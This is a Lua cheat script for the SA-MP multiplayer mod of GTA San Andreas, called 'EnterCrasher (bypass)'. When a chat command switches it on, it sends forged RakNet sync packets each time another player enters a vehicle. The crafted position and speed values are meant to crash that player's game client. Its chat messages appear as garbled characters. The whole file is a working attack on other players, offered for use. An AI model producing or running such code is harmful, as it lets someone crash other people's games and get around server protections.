script_name("EnterCrasher (bypass)")
script_author("seven.eXe")

local samp = require "samp.events"
local act = false

function main()
    repeat wait(0) until isSampAvailable()
    sendMessage("��������. �����: S E V E N")
    sampRegisterChatCommand("ecrash", function()
        act = not act
        sendMessage(act and "{464446}�������." or "{464446}��������")
    end)
end

function samp.onPlayerEnterVehicle(playerId, enterId, passenger)
    lua_thread.create(function()
        if act then
            local _, crashedVehicle = sampGetCarHandleBySampVehicleId(enterId)
            local vehPos = {getCarCoordinates(crashedVehicle)}
            wait(200)
            local data = samp_create_sync_data('player')
            data.position = {vehPos[1], vehPos[2], vehPos[3]}
            data.moveSpeed = {0.4999, 0.4999, 0.4999}
            data.send()
            local data = samp_create_sync_data('unoccupied')
            data.vehicleId = enterId
            data.seatId = 0
            data.position = {vehPos[1], vehPos[2], vehPos[3] - 0.5}
            data.send()
            sendMessage("[" .. playerId .. "] �������.")
        end
    end)
end

function samp_create_sync_data(sync_type, copy_from_player)
    local ffi = require 'ffi'
    local sampfuncs = require 'sampfuncs'
    -- from SAMP.Lua
    local raknet = require 'samp.raknet'
    require 'samp.synchronization'

    copy_from_player = copy_from_player or true
    local sync_traits = {
        player = {'PlayerSyncData', raknet.PACKET.PLAYER_SYNC, sampStorePlayerOnfootData},
        vehicle = {'VehicleSyncData', raknet.PACKET.VEHICLE_SYNC, sampStorePlayerIncarData},
        passenger = {'PassengerSyncData', raknet.PACKET.PASSENGER_SYNC, sampStorePlayerPassengerData},
        aim = {'AimSyncData', raknet.PACKET.AIM_SYNC, sampStorePlayerAimData},
        trailer = {'TrailerSyncData', raknet.PACKET.TRAILER_SYNC, sampStorePlayerTrailerData},
        unoccupied = {'UnoccupiedSyncData', raknet.PACKET.UNOCCUPIED_SYNC, nil},
        bullet = {'BulletSyncData', raknet.PACKET.BULLET_SYNC, nil},
        spectator = {'SpectatorSyncData', raknet.PACKET.SPECTATOR_SYNC, nil}
    }
    local sync_info = sync_traits[sync_type]
    local data_type = 'struct ' .. sync_info[1]
    local data = ffi.new(data_type, {})
    local raw_data_ptr = tonumber(ffi.cast('uintptr_t', ffi.new(data_type .. '*', data)))
    -- copy player's sync data to the allocated memory
    if copy_from_player then
        local copy_func = sync_info[3]
        if copy_func then
            local _, player_id
            if copy_from_player == true then
                _, player_id = sampGetPlayerIdByCharHandle(PLAYER_PED)
            else
                player_id = tonumber(copy_from_player)
            end
            copy_func(player_id, raw_data_ptr)
        end
    end
    -- function to send packet
    local func_send = function()
        local bs = raknetNewBitStream()
        raknetBitStreamWriteInt8(bs, sync_info[2])
        raknetBitStreamWriteBuffer(bs, raw_data_ptr, ffi.sizeof(data))
        raknetSendBitStreamEx(bs, sampfuncs.HIGH_PRIORITY, sampfuncs.UNRELIABLE_SEQUENCED, 1)
        raknetDeleteBitStream(bs)
    end
    -- metatable to access sync data and 'send' function
    local mt = {
        __index = function(t, index)
            return data[index]
        end,
        __newindex = function(t, index, value)
            data[index] = value
        end
    }
    return setmetatable({send = func_send}, mt)
end

function sendMessage(text)
	tag = '{464446}[Enter{850AB9}Crasher{464446}]: {850AB9}'
	sampAddChatMessage(tag .. text, -1)
end